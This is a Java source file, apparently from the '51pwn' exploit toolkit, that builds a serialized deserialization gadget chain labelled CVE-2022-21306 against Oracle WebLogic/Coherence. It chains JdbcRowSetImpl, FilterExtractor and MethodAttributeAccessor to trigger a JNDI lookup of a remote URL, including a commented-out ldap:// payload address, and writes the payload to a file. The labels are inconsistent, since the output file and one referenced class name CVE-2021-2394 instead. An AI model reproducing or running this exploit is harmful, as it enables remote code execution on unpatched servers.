package com._51pwn.CVE_2022_21306;

import com._51pwn.Tools;
import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;
import oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;
import ysoserial.payloads.util.Reflections;

import javax.swing.plaf.synth.SynthLookAndFeel;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

// CVE-2022-21306
/*
<synth>
  <style id="button">
    <font name="Monospaced" size="24" style="BOLD"/>
    <state value="MOUSE_OVER">
      <font name="SansSerif" size="48" style="ITALIC"/>
      <opaque value="TRUE"/>
      <color value="BLUE" type="BACKGROUND"/>
    </state>
    <state value="PRESSED">
      <font name="Serif" size="36" style="BOLD AND ITALIC"/>
      <opaque value="TRUE"/>
      <color value="RED" type="BACKGROUND"/>
    </state>
  </style>
  <bind style="button" type="region" key="Button"/>
  <style id="textfield">
     <opaque value="true"/>
     <state>
        <color value="#C2E2CF" type="BACKGROUND"/>
        <color value="#000000" type="TEXT_FOREGROUND"/>
     </state>
     <imagePainter method="textFieldBorder" path="text.png"
        sourceInsets="3 3 3 3" paintCenter="false"/>
     <insets top="3" left="3" bottom="3" right="3"/>
  </style>
  <bind style="textfield" type="region" key="TextField"/>
</synth>
* */
public class Main {
    public static void main(String[] args) throws Exception {
        System.setProperty("sun.io.serialization.extendedDebugInfo", "false");
        SynthLookAndFeel laf = new SynthLookAndFeel();
        String ldap = "http://127.0.0.1:8888/51pwn_com.xml";//args[0];//"ldap://docker.for.mac.localhost:1389/UpX34defineClass";
        // docker.for.mac.localhost
        System.out.println(ldap);

        System.setProperty("sun.io.serialization.extendedDebugInfo", "true");


        // 未后续 操作 方法 getDatabaseMetaData 进行定义
        MethodAttributeAccessor accessor = Tools.GetMethodAttributeAccessor("getDataSourceName");
        accessor.setSetMethodName("load");
        JdbcRowSetImpl jdbcRowSet = Tools.GetJdbcRowSetImpl(ldap);

        FilterExtractor extractor = new FilterExtractor(accessor);
        FilterExtractor extractor1 = new FilterExtractor(new com._51pwn.CVE_2021_2394.Main.TLSAttributeAccessor());
        SortedBag sortedBag = new TopNAggregator.PartialResult(extractor1, 2);
        AttributeHolder attributeHolder = new AttributeHolder();
        sortedBag.add(jdbcRowSet);

        Reflections.setFieldValue(sortedBag,"m_comparator",extractor);
        // setInternalValue
        Reflections.setFieldValue(attributeHolder,"m_oValue",sortedBag);

        Tools.WtOo1(attributeHolder,"CVE_2021_2394_Payload.dat");
        System.out.println("write ok");
        System.getProperties().put("jarName","CVE_2021_2394_PowerBy_51pwn.jar");
//        com._51pwn.hktalent.CreatJar.main(args);
//        System.getProperties().put("jarName","CVE-2022-21350_powerBy_51pwn.jar");
//        com._51pwn.hktalent.CreatJar.main(args);
    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.flush();
            os.close();
            System.out.println("ok: test.ser");
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }
}